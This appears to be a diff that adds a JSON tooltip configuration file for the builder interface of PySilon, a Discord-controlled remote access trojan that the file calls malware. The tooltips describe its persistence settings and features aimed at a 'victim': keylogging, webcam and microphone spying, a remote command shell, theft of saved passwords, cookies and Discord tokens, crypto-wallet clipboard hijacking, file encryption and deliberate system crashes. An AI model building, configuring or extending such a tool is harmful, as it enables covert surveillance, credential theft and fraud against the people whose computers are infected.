@@ -1,0 +1,33 @@
+{
+    "malware_version": "4.0",
+    "tooltips": {
+        "token_entry": "Token obtained from Discord Developer Portal.", 
+        "guildids_entry": "Target server IDs that will be used by PySilon. You can add more servers by separating them with semicolon(;).", 
+        "registry_entry": "Name of PySilon's entry in Registry Editor. Filling this field is required if you want PySilon to run after reboot.", 
+        "directory_entry": "Name of directory that will be created in \"C:\\Users\\%username%\" and used by PySilon.", 
+        "executable_entry": "Name of executable that will contain PySilon on target PC. NOTE: Don't include \".exe\" extension.", 
+        "implode_entry": "A secret key that will be required to remotely remove PySilon from a PC using \".implode\" command.", 
+        "keylogr": "Log every key pressed by victim.", 
+        "scrnsht": "Take screenshot of victim's PC", 
+        "f_manag": "Explore, download, upload, remove or encrypt files.", 
+        "grabber": "Grab saved WiFi passwords, Browser-saved passwords, Discord Tokens, Cookies, Browser history.", 
+        "mc_live": "Stream live microphone input using voice channel.", 
+        "mc_recc": "Record microphone input as long as victim has their PC turned on.", 
+        "process": "Browse through processes, kill them, blacklist them (blacklisted process won't last more than a second).", 
+        "rev_shl": "Execute remote CMD commands on victim's PC.", 
+        "webcam_": "Take images using connected webcam.", 
+        "scrnrec": "Record the victim's screen.", 
+        "inputbl": "Block mouse and keyboard input.", 
+        "bluesod": "Blue Screen of Death (kinda crashes victim's PC).", 
+        "crclipr": "Swap copied crypto-wallet addresses to your defined ones.", 
+        "forkbmb": "Crash victim's PC.", 
+        "messger": "Communicate with your victim with plenty of ways.", 
+        "txtspee": "Whatever you type, victim's computer will read it out loud.", 
+        "audctrl": "Control victim's audio settings.", 
+        "monctrl": "Turn off victim's monitors.", 
+        "webbloc": "Block any website.", 
+        "jmpscar": "Kinda nothing to add here.", 
+        "keystrk": "Type words using your victim's keyboard.", 
+        "scrnman": "Manipulate computer's graphics and display basically anything."
+    }
+}
